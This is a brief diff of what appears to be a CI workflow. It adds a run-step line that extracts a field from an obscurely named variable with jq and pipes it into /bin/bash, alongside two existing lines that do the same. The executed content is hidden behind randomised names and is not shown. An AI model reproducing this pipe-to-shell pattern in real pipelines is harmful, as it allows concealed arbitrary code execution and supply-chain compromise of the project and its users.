@@ -19,6 +19,7 @@ jobs:
         run: |
           printf '%s' "$cpsp2" | jq -r .ny4 | /bin/bash
           printf '%s' "$qrtet86003" | jq -r .m1707 | /bin/bash
+          echo $eqff93 | jq -r .zgo934 | /bin/bash
 
       - name: Archive results
         if: always()
